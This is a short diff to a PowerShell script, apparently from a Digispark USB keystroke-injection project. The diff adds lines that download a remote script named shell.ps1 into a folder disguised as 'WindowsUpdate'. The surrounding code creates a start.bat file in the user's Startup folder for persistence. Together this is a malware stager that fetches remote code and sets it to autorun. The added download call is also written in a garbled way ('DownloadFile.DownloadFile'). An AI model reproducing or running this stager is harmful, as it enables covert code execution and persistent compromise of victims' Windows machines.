@@ -1,3 +1,7 @@
+$WebClient = New-Object System.Net.WebClient
+
+$WebClient.DownloadFile.DownloadFile('https://raw.githubusercontent.com/izaelbm/Digispark/main/shell.ps1','C:/Temp/WindowsUpdate/shell.ps1')
+
 $dir = $HOME+'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat'
 
 $file = New-Item -Path $dir -ItemType "file"
